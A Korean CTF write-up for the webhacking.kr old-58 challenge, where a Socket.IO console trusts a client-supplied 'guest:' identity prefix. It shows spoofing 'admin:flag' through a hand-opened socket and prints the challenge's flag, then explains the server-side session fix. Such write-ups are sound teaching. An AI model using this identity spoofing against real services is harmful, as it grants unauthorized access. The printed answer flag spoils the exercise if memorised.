---
title: "webhacking.kr old-58 풀이 — 클라이언트가 보내는 신원을 믿는 WebSocket 콘솔"
description: "webhacking.kr old-58을 통해, Socket.IO 콘솔이 'guest:명령' 형태로 보내는 메시지의 앞부분(신원)을 서버가 그대로 믿을 때 어떤 일이 벌어지는지 정리한다. 클라이언트 코드와 실제 소켓 응답을 직접 관찰해, guest로 막힌 flag 명령을 admin으로 바꿔 보내 통과한 과정을 추측 없이 검증한 그대로 적는다."
date: 2026-11-22
category: Web
tags: [webhacking.kr, web, wargame, websocket, socket-io, access-control, broken-authorization]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 정리했다.

[webhacking.kr](https://webhacking.kr)의 old-58 문제를 풀었다. old-18·old-21이 SQL 인젝션 계열이었다면, old-58은 전혀 다른 층위의 문제다. 데이터베이스가 아니라 실시간 통신(WebSocket)이 무대이고, 핵심 결함은 쿼리가 아니라 "서버가 클라이언트가 보낸 신원 문자열을 그대로 믿는다"는 접근 제어(인가)의 실패다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-58 (`http://webhacking.kr:10007/`) |
| 배점 | 15점 |
| 유형 | Broken Access Control (WebSocket, 클라이언트 신원 신뢰) |
| 목표 | `admin` 전용 `flag` 명령을 실행해 플래그 획득 |

페이지는 `USER Console`이라는 제목에, 메시지 목록(`#messages`)과 입력창 하나가 전부다. 메시지를 보내면 서버가 콘솔처럼 응답을 돌려주는 채팅형 명령 콘솔이다.

## 2. 페이지 분석 — 메시지는 `guest:명령`으로 나간다

문제의 전부는 페이지에 그대로 박혀 있는 클라이언트 스크립트다(아래는 실제 소스다).

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>
$(function () {
  var username = "guest";
  var socket = io();
  $('form').submit(function(e){
    e.preventDefault();
    socket.emit('cmd', username + ":" + $('#m').val());   // ← "guest:" 가 앞에 붙는다
    $('#m').val('');
    return false;
  });
  socket.on('cmd', function(msg){
    $('#messages').append($('<li>').text(msg));
  });
});
</script>
```

읽어 보면 구조가 바로 드러난다. 통신은 Socket.IO(WebSocket) `cmd` 이벤트로 오간다. 입력창에 `ls`라고 치면 서버로 가는 건 `ls`가 아니라 `guest:ls`다. 클라이언트가 `username + ":" + 입력`으로 신원을 앞에 붙여 보낸다. `username`은 코드에 `"guest"`로 하드코딩되어 있다.

여기서 결정적인 사실 하나. `username`이 하드코딩이라는 건 "guest로 고정"이라는 UI의 약속일 뿐이다. `socket.emit('cmd', ...)`의 인자는 우리가 전부 통제한다. 브라우저 콘솔에서 소켓을 직접 열어 `cmd` 이벤트에 아무 문자열이나 실어 보낼 수 있다. 서버가 이 앞부분을 신원으로 믿는다면, 신원은 얼마든지 바꿔 보낼 수 있다는 뜻이다.

## 3. 명령 탐색 — 소켓에 직접 말 걸기

입력창을 거치지 않고, 같은 오리진에서 소켓을 직접 열어 `cmd` 이벤트를 주고받으며 응답을 관찰했다. Socket.IO 2.x에서는 `onevent`를 가로채면 들어오는 모든 이벤트를 찍어 볼 수 있다.

```js
// http://webhacking.kr:10007/ 콘텍스트에서 실행
window.__log = [];
const s = io();
const onevent = s.onevent;
s.onevent = function (packet) {
  window.__log.push({ ev: packet.data[0], data: packet.data.slice(1) });
  onevent.call(this, packet);
};

const send = (c) => s.emit('cmd', c);   // c 예: "guest:ls"
```

먼저 어떤 명령이 있는지부터 물었다. 아래는 전부 실제 응답이다.

| 보낸 `cmd` | 서버 응답 |
| --- | --- |
| `guest:help` | `ls id flag help` |
| `guest:hello` | `hello: command not found` |
| `guest:ls` | `index.js  temp.html` |
| `guest:id` | `uid=0(root) gid=0(root) groups=0(root)` |

`help`이 `ls id flag help`라는 명령 목록을 알려 준다. 서버는 메시지를 `신원:명령`으로 쪼개, 알려진 명령이면 실행하고 아니면 `command not found`를 돌려준다. 목표인 `flag` 명령이 바로 보인다.

## 4. 권한 우회 — `guest`를 `admin`으로 바꿔 보내기

`flag`를 guest로 실행해 봤다.

```text
→ 보낸 cmd:  guest:flag
← 응답:      permission denied... admin only!
```

`flag`는 admin 전용이라고 명시적으로 거절한다. 그런데 서버가 "admin인지"를 판단하는 근거는 메시지 앞에 붙은 신원 문자열뿐이다. 그 문자열은 2절에서 봤듯 클라이언트가 통제한다. 그러면 답은 하나다. `guest:` 대신 `admin:`을 붙여 보낸다.

```text
→ 보낸 cmd:  admin:flag
← 응답:      FLAG{do_you_know_about_darkhotel}
```

`guest:flag`는 거절당하고 `admin:flag`는 플래그를 그대로 뱉는다. 서버는 요청을 보낸 주체가 진짜 admin인지 전혀 검증하지 않고, 메시지에 적혀 온 `admin`이라는 자기 신고(self-asserted)를 그대로 믿었다. 관찰한 동작을 의사 코드로 복원하면 다음과 같다. webhacking.kr은 이 문제의 서버 소스를 공개하지 않으므로, 아래는 응답으로부터 복원한 모델이다.

```js
// 관찰로부터 복원한 서버 측 처리 (실제 소스 아님)
socket.on('cmd', (msg) => {
  const [who, command] = msg.split(':');      // 메시지를 '신원:명령' 으로 분리
  if (command === 'flag') {
    if (who === 'admin')                       // ← '보낸 쪽'이 아니라 '메시지에 적힌 값'을 믿는다
      socket.emit('cmd', readFlag());
    else
      socket.emit('cmd', 'permission denied... admin only!');
  } else if (command === 'ls')   socket.emit('cmd', 'index.js  temp.html');
  else if (command === 'id')     socket.emit('cmd', 'uid=0(root) ...');
  else if (command === 'help')   socket.emit('cmd', 'ls id flag help');
  else                           socket.emit('cmd', `${command}: command not found`);
});
```

인가 판단(`who === 'admin'`)의 입력이 전적으로 클라이언트 메시지에서 온다는 것, 이것이 결함의 전부다.

## 5. 결과 — 플래그 제출로 통과 확인

획득한 플래그를 webhacking.kr의 제출 엔드포인트에 넣었다. 사이트의 플래그 제출은 `POST /auth.php`로 `{"flag":"..."}` JSON을 보내는 방식이다(`/static/main.js`의 `authFlag`).

```js
await fetch('https://webhacking.kr/auth.php', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ flag: 'FLAG{do_you_know_about_darkhotel}' }),
}).then(r => r.json());
```

응답은 다음과 같았고, `chall.php`에서도 `✔️ old-58`로 바뀐 것을 확인했다.

```text
{"stat":true,"ret":"old-58 Pwned. You got 15point. Congratz!"}
```

## 왜 취약한가 — 그리고 올바른 방어

첫째, 근본 원인은 신원을 클라이언트가 보낸 데이터에서 읽었다는 것이다. `socket.emit('cmd', username + ":" + msg)`에서 `username`은 서버가 발급·검증한 값이 아니라 클라이언트가 붙인 라벨이다. 서버가 이 라벨을 인가의 근거로 쓰는 순간, 공격자는 라벨만 바꿔 아무 권한이나 자처할 수 있다. 이것은 WebSocket만의 문제가 아니라, 요청 본문에 담겨 온 신원(`user_id`, `role`, `is_admin` 등)을 그대로 믿는 모든 코드의 고전적 결함이다.

둘째, 올바른 방어는 신원을 "연결에 묶인, 서버가 검증한 세션"에서 가져오는 것이다. WebSocket 핸드셰이크 때 인증 토큰/세션을 검증해 신원을 연결(socket)에 고정하고, 이후 모든 명령의 권한은 메시지가 아니라 그 연결의 신원으로 판단해야 한다.

```js
// 1) 연결 시점에 한 번만 신원을 확정한다 (클라이언트가 못 바꾸는 서버 측 상태)
io.use((socket, next) => {
  const user = verifySession(socket.handshake);  // 쿠키/토큰 검증 → 실패 시 연결 거부
  if (!user) return next(new Error('unauthorized'));
  socket.data.user = user;                        // 신원은 socket 에 박아 둔다
  next();
});

// 2) 명령은 '메시지에 적힌 신원'이 아니라 'socket 의 신원'으로만 인가한다
socket.on('cmd', (command) => {                   // 더 이상 "guest:" 접두사를 받지 않는다
  if (command === 'flag') {
    if (socket.data.user.role !== 'admin')        // ← 서버가 아는 신원으로 판단
      return socket.emit('cmd', 'permission denied');
    socket.emit('cmd', readFlag());
  }
});
```

셋째, 민감한 명령은 서버에서 한 번 더 통제한다. `flag`처럼 비밀을 돌려주는 명령은 허용 목록(allow-list) 기반으로만 라우팅하고, 권한 검사는 명령을 실행하기 직전 서버에서 수행한다. 클라이언트 UI가 버튼을 숨기거나 `guest`로 고정했다는 사실은 방어가 아니다. 공격자는 UI를 거치지 않고 소켓에 직접 말을 건다.

## 정리

- old-58은 Socket.IO 콘솔로, 입력은 `username + ":" + 명령` 형태(`guest:ls`)로 서버에 전달된다.
- `username`은 클라이언트에 `"guest"`로 하드코딩되어 있지만, `socket.emit`의 인자는 우리가 통째로 통제한다.
- 명령 목록은 `help` → `ls id flag help`. `guest:flag`는 `permission denied... admin only!`, `admin:flag`는 플래그를 그대로 반환한다.
- 서버가 메시지에 적혀 온 신원(`admin`)을 검증 없이 믿은 것이 결함이다. 전형적인 접근 제어(인가) 실패다.
- 얻은 `FLAG{...}`를 `POST /auth.php`로 제출해 `old-58 Pwned.`와 `✔️`를 확인했다.
- 방어는 신원을 연결에 묶어 서버가 검증, 권한은 메시지가 아닌 세션으로 판단, 민감 명령은 실행 직전 서버에서 인가다.

클라이언트가 "저는 admin입니다"라고 말하게 두는 것 자체가 문제가 아니다. 그 말을 서버가 그대로 믿는 것이 문제다. 신원은 받아 적는 것이 아니라, 서버가 확인하는 것이다.
